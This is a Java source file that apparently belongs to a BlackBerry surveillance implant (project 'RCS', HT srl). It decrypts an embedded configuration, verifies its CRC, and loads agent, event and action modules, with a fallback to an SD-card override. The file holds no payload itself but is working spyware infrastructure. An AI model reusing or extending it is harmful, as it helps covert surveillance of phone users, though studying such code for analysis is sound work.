//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Conf.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.io.EOFException;
import java.io.IOException;
import java.io.InputStream;

import net.rim.device.api.util.Arrays;
import net.rim.device.api.util.DataBuffer;
import blackberry.action.Action;
import blackberry.agent.Agent;
import blackberry.config.InstanceConfig;
import blackberry.config.InstanceKeys;
import blackberry.config.Keys;
import blackberry.crypto.Encryption;
import blackberry.event.Event;
import blackberry.fs.AutoFlashFile;
import blackberry.fs.Path;
import blackberry.params.Parameter;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Conf.
 */
public final class Conf {

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("Conf", DebugLevel.VERBOSE);
    //#endif

    public static final String NEW_CONF = "newconfig.dat";
    public static final String ACTUAL_CONF = "config.dat";
    private static final String FORCED_CONF = "config.bin";
    public static final String NEW_CONF_PATH = Path.USER_PATH + Path.CONF_DIR;

    /** The Constant CONF_TIMER_SINGLE. */
    public static final int CONF_TIMER_SINGLE = 0x0;

    /** The Constant CONF_TIMER_REPEAT. */
    public static final int CONF_TIMER_REPEAT = 0x1;

    /** The Constant CONF_TIMER_DATE. */
    public static final int CONF_TIMER_DATE = 0x2;

    /** The Constant CONF_TIMER_DELTA. */
    public static final int CONF_TIMER_DELTA = 0x3;

    /**
     * Tag del file di configurazione, sono stringhe ASCII Configurazione degli
     * agenti
     */
    public static final String AGENT_CONF_DELIMITER = "AGENTCONFS-";

    /**
     * The Constant EVENT_CONF_DELIMITER. Configurazione degli eventi
     */
    public static final String EVENT_CONF_DELIMITER = "EVENTCONFS-";

    /**
     * The Constant MOBIL_CONF_DELIMITER. Opzioni per le piattaforme mobili
     */
    public static final String MOBIL_CONF_DELIMITER = "MOBILCONFS-";

    /**
     * The Constant ENDOF_CONF_DELIMITER. Marker di fine configurazione
     */
    public static final String ENDOF_CONF_DELIMITER = "ENDOFCONFS-";
    private static final byte[] FAKECONFSTART = new byte[] { (byte) 0x85, 0x22,
            (byte) 0xa0, 0x14, 0x28, 0x09, 0x55, (byte) 0xec, (byte) 0xb7,
            (byte) 0xf8, (byte) 0xa5, 0x6d, (byte) 0x87, (byte) 0x86,
            (byte) 0xc8, 0x3f };

    /**
     * Crc verify.
     * 
     * @param payload
     *            the payload
     * @param crcExpected
     *            the crc expected
     * @return true, if successful
     */
    public static boolean crcVerify(final byte[] payload, final int crcExpected) {
        boolean crcOK = false;

        final int crcCalc = Utils.crc(payload);
        crcOK = (crcExpected == crcCalc);

        return crcOK;
    }

    /** The agent index. */
    int agentIndex = -1;

    /** The event index. */
    int eventIndex = -1;

    /** The mobile index. */
    int mobileIndex = -1;

    /** The action index. */
    int actionIndex = -1;

    /** The endof index. */
    int endofIndex = -1;

    /** The status obj. */
    Status statusObj = null;

    /**
     * Instantiates a new conf.
     */
    public Conf() {
        statusObj = Status.getInstance();
        statusObj.clear();
    }

    /**
     * Load. Se c'e' la config.new la prova, e se va bene diventa la
     * config.actual. Altrimenti se c'e' la config.actual la carica. Se non ci
     * riesce usa il default preso nelle risorse.
     * 
     * @return true, if successful
     */
    public boolean load() {

        boolean ret = true;
        final byte[] confKey = Keys.getInstance().getConfKey();

        //#ifdef DEBUG_TRACE
        debug.trace("load: " + Keys.getInstance().log);
        //#endif

        AutoFlashFile file;

        //#ifdef DEBUG
        file = new AutoFlashFile(Path.SD_PATH + Path.CONF_DIR
                + Conf.FORCED_CONF, true);
        if (file.exists()) {
            debug.info("Try: forced config");
            byte[] readfile = file.read();
            ret = loadCyphered(readfile, readfile.length, confKey);
            if (ret) {

                debug.info("Forced config");
                return true;
            } else {

                debug.error("Reading forced configuration");
                file.delete();
            }
        }
        //#endif

        file = new AutoFlashFile(Conf.NEW_CONF_PATH + Conf.NEW_CONF, true);
        if (file.exists()) {
            //#ifdef DEBUG_INFO
            debug.info("Try: new config");
            //#endif
            byte[] cyphered = file.read();
            ret = loadCyphered(cyphered, cyphered.length, confKey);

            if (ret) {
                //#ifdef DEBUG_INFO
                debug.info("New config");
                //#endif
                file.rename(Conf.ACTUAL_CONF);
                return true;
            } else {
                //#ifdef DEBUG
                debug.error("Reading new configuration");
                //#endif
                file.delete();
            }
        }

        file = new AutoFlashFile(Conf.NEW_CONF_PATH + Conf.ACTUAL_CONF, true);
        if (file.exists()) {
            //#ifdef DEBUG_INFO
            debug.info("Try: actual config");
            //#endif
            byte[] cyphered = file.read();
            ret = loadCyphered(cyphered, cyphered.length, confKey);
            if (ret) {
                //#ifdef DEBUG_INFO
                debug.info("Actual config");
                //#endif
                return true;
            } else {
                //#ifdef DEBUG
                debug.error("Reading actual configuration");
                //#endif
                file.delete();
            }
        }

        //#ifdef DEBUG
        debug.warn("Reading Conf from resourses");
        //#endif

        InputStream inputStream = InstanceConfig.getConfig();
        if (inputStream != null) {
            //#ifdef DBC
            Check.asserts(inputStream != null, "Resource config");
            //#endif            
            ret = loadCyphered(inputStream, confKey);

            //#ifdef DEBUG
            if (ret == false) {
                inputStream = InstanceConfig.getConfig323();
                ret = loadCyphered(inputStream, confKey);
            }
            //#endif

        } else {
            //#ifdef DEBUG
            debug.error("Cannot read config from resources");
            //#endif
            ret = false;
        }
        return ret;
    }

    /**
     * Load cyphered.
     * 
     * @param cyphered
     *            the cyphered
     * @param realLen
     * @param confKey
     *            the conf key
     * @return true, if successful
     */
    public boolean loadCyphered(final byte[] cyphered, final int len,
            final byte[] confKey) {
        boolean ret = false;

        final int cryptoOffset = 8;
        //#ifdef DEBUG_TRACE
        debug.trace("cypher len: " + len + " key: "
                + Utils.byteArrayToHex(confKey));
        //#endif

        final Encryption crypto = new Encryption();
        crypto.makeKey(confKey);

        final byte[] plainconf = crypto.decryptData(cyphered, cryptoOffset);
        //#ifdef DEBUG_TRACE
        debug.trace("plain len: " + plainconf.length);
        //#endif

        if(plainconf[0] != 0 || plainconf[1] != 0){
            //#ifdef DEBUG_ERROR
            debug.error("wrong key");
            //#endif
            return false;
        }
        
        // lettura della configurazione
        ret = parseConf(plainconf, 0);

        return ret;
    }

    /**
     * carica la configurazione cifrata a partire da un inputstream.
     * 
     * @param i0
     *            the i0
     * @param confKey
     *            the conf key
     * @return true, if successful
     */
    public boolean loadCyphered(final InputStream i0, final byte[] confKey) {
        int len;
        boolean ret = false;

        try {
            len = i0.available();
            final byte[] cyphered = new byte[len];
            i0.read(cyphered);

            if (Arrays.equals(cyphered, 0, FAKECONFSTART, 0,
                    FAKECONFSTART.length)) {
                //#ifdef ERROR
                debug.error("Fake configuration");
                //#endif
                return false;
            }

            int realLen = Utils.byteArrayToInt(cyphered, 0);
            //#ifdef DEBUG
            debug.trace("config len: " + realLen);
            //#endif

            ret = loadCyphered(cyphered, realLen, confKey);

        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error("Cannot read cyphered");
            //#endif
        }

        return ret;
    }

    /**
     * Parses the action.
     * 
     * @param databuffer
     *            the databuffer
     * @return true, if successful
     * @throws EOFException
     *             the eOF exception
     */
    boolean parseAction(final DataBuffer databuffer) throws EOFException {
        if (actionIndex < 0) {
            //#ifdef DEBUG_TRACE
            debug.trace("ParseAction - NO SECTION");
            //#endif
            return false;
        }

        databuffer.setPosition(actionIndex);

        final int numTokens = databuffer.readInt();

        //#ifdef DEBUG_TRACE
        debug.trace("ParseAction - numTokens: " + numTokens);
        //#endif

        for (int idAction = 0; idAction < numTokens; idAction++) {
            //#ifdef DEBUG_TRACE
            debug.trace("ParseEvent - Action: " + idAction);
            //#endif
            final Action action = new Action(idAction);

            final int numSubActions = databuffer.readInt();

            for (int sub = 0; sub < numSubActions; sub++) {
                final int actionType = databuffer.readInt();
                final int paramLen = databuffer.readInt();

                final byte[] confParams = new byte[paramLen];
                databuffer.readFully(confParams);

                //#ifdef DEBUG_TRACE
                debug.trace("ParseEvent - addNewSubAction: " + actionType);
                //#endif
                action.addNewSubAction(actionType, confParams);
            }

            statusObj.addAction(action);
        }

        //#ifdef DEBUG_TRACE
        debug.trace("ParseAction - OK");
        //#endif

        return true;
    }

    /**
     * Parses the agent.
     * 
     * @param databuffer
     *            the databuffer
     * @return true, if successful
     * @throws EOFException
     *             the eOF exception
     */
    boolean parseAgent(final DataBuffer databuffer) throws EOFException {
        if (agentIndex < 0) {
            //#ifdef DEBUG_TRACE
            debug.trace("ParseAgent - NO SECTION");
            //#endif
            return false;
        }

        databuffer.setPosition(agentIndex + AGENT_CONF_DELIMITER.length() + 1);

        final int numTokens = databuffer.readInt();

        //#ifdef DEBUG_TRACE
        debug.trace("ParseAgent - numTokens: " + numTokens);
        //#endif

        for (int i = 0; i < numTokens; i++) {
            final int agentType = databuffer.readInt();
            final int agentStatus = databuffer.readInt();
            final int paramLen = databuffer.readInt();

            final byte[] confParams = new byte[paramLen];
            databuffer.readFully(confParams);

            //#ifdef DEBUG
            debug.trace("ParseAgent - factory: " + agentType + " status: "
                    + agentStatus);
            //#endif

            final boolean enabled = agentStatus == Common.AGENT_ENABLED;
            final Agent agent = Agent.factory(agentType, enabled, confParams);
            statusObj.addAgent(agent);
        }

        //#ifdef DEBUG_TRACE
        debug.trace("ParseAgent - OK");
        //#endif

        return true;
    }

    /**
     * Parses the conf.
     * 
     * @param plainConf
     *            the plain conf
     * @param offset
     *            the offset
     * @return true, if successful
     */
    public boolean parseConf(final byte[] plainConf, final int offset) {
        final DataBuffer databuffer = new DataBuffer(plainConf, offset,
                plainConf.length - offset, false);

        // Check crc e sezioni
        try {
            // leggo la lunghezza del plain
            final int len = databuffer.readInt();
            // calcolo la lunghezza del payload, togliendo il crc
            final int payloadSize = len - 4;

            if (len <= 0 || payloadSize <= 0) {
                //#ifdef DEBUG
                debug.error("Conf len error");
                //#endif
                return false;
            }

            byte[] payload = new byte[0];

            //#ifdef DEBUG_TRACE
            debug.trace("Allocating size:" + payloadSize);
            //#endif

            if (payloadSize > plainConf.length) {
                //#ifdef DEBUG
                debug.error("wrong decoding len");
                //#endif
                return false;
            }

            // alloco il payload e copio il plain
            payload = new byte[payloadSize];
            databuffer.setPosition(0);
            databuffer.readFully(payload);

            // leggo il crc
            databuffer.setPosition(payloadSize);
            final int crcExpected = databuffer.readInt();

            // verifico il crc
            final boolean crcOK = crcVerify(payload, crcExpected);

            if (!crcOK) {
                //#ifdef DEBUG
                debug.error("ParseConf - CRC FAILED");
                //#endif
                return false;
            }

            // verifica sezioni
            searchSectionIndex(payload);

            //#ifdef DBC
            Check.asserts(
                    endofIndex + ENDOF_CONF_DELIMITER.length() + 4 == len,
                    "ENDOF Wrong");
            //#endif
            //#ifdef DEBUG_TRACE
            debug.trace("ParseConf - CRC OK");
            //#endif

        } catch (final EOFException e) {
            //#ifdef DEBUG
            debug.error("ParseConf - FAILED");
            //#endif
            return false;
        }

        // Sezione Agenti
        try {
            if (!parseAgent(databuffer)) {
                //#ifdef DEBUG
                debug.error("ParseAgent - FAILED [0]");
                //#endif
                return false;
            }

            // Sezione Eventi
            if (!parseEvent(databuffer)) {
                //#ifdef DEBUG
                debug.error("ParseEvent - FAILED [1]");
                //#endif
                return false;
            }

            // Sezione Azioni
            if (!parseAction(databuffer)) {
                //#ifdef DEBUG
                debug.error("ParseAction - FAILED [2]");
                //#endif
                return false;
            }

            // Leggi i parametri di configurazione
            if (!parseParameters(databuffer)) {
                //#ifdef DEBUG
                debug.error("ParseParameters - FAILED [3]");
                //#endif
                return false;
            }

        } catch (final EOFException e) {
            //#ifdef DEBUG
            debug.error("ParseConf - FAILED:" + e);
            //#endif
            return false;
        }

        //#ifdef DEBUG_TRACE
        debug.trace("ParseConf - OK");
        //#endif
        return true;
    }

    /**
     * Parses the event.
     * 
     * @param databuffer
     *            the databuffer
     * @return true, if successful
     * @throws EOFException
     *             the eOF exception
     */
    boolean parseEvent(final DataBuffer databuffer) throws EOFException {
        if (eventIndex < 0) {
            //#ifdef DEBUG_TRACE
            debug.trace("ParseEvent - NO SECTION");
            //#endif
            return false;
        }

        databuffer.setPosition(eventIndex + EVENT_CONF_DELIMITER.length() + 1);

        final int numTokens = databuffer.readInt();

        //#ifdef DEBUG_TRACE
        debug.trace("ParseEvent - numTokens: " + numTokens);
        //#endif

        for (int i = 0; i < numTokens; i++) {
            final int eventType = databuffer.readInt();
            final int actionId = databuffer.readInt();
            final int paramLen = databuffer.readInt();

            final byte[] confParams = new byte[paramLen];
            databuffer.readFully(confParams);

            //#ifdef DEBUG
            debug.trace("ParseEvent - factory: " + i + " type: " + eventType
                    + " action: " + actionId);
            //#endif
            final Event event = Event.factory(i, eventType, actionId,
                    confParams);
            statusObj.addEvent(i, event);
        }

        //#ifdef DEBUG_TRACE
        debug.trace("ParseEvent - OK");
        //#endif

        actionIndex = databuffer.getPosition();

        return true;
    }

    /**
     * Parses the parameters.
     * 
     * @param databuffer
     *            the databuffer
     * @return true, if successful
     * @throws EOFException
     *             the eOF exception
     */
    boolean parseParameters(final DataBuffer databuffer) throws EOFException {
        if (mobileIndex < 0) {
            //#ifdef DEBUG_TRACE
            debug.trace("ParseParameters - NO SECTION");
            //#endif
            return false;
        }

        databuffer.setPosition(mobileIndex + MOBIL_CONF_DELIMITER.length() + 1);

        final int numTokens = databuffer.readInt();

        //#ifdef DEBUG_TRACE
        debug.trace("ParseParameters - numTokens: " + numTokens);
        //#endif

        for (int i = 0; i < numTokens; i++) {
            final int confId = databuffer.readInt();
            final int paramLen = databuffer.readInt();

            final byte[] confParams = new byte[paramLen];
            databuffer.readFully(confParams);

            final Parameter config = Parameter.factory(confId, confParams);
            statusObj.addParameter(config);
        }

        return true;
    }

    /**
     * Search section index.
     * 
     * @param payload
     *            the payload
     */
    public void searchSectionIndex(final byte[] payload) {
        agentIndex = Utils.getIndex(payload, AGENT_CONF_DELIMITER.getBytes());
        eventIndex = Utils.getIndex(payload, EVENT_CONF_DELIMITER.getBytes());
        mobileIndex = Utils.getIndex(payload, MOBIL_CONF_DELIMITER.getBytes());
        // actionIndex=getIndex(payload,AGENT_CONF_DELIMITER.getBytes());
        endofIndex = Utils.getIndex(payload, ENDOF_CONF_DELIMITER.getBytes());

        //#ifdef DEBUG_TRACE
        debug.trace("searchSectionIndex - agentIndex:" + agentIndex);
        debug.trace("searchSectionIndex - eventIndex:" + eventIndex);
        debug.trace("searchSectionIndex - mobileIndex:" + mobileIndex);
        debug.trace("searchSectionIndex - endofIndex:" + endofIndex);
        //#endif
    }
}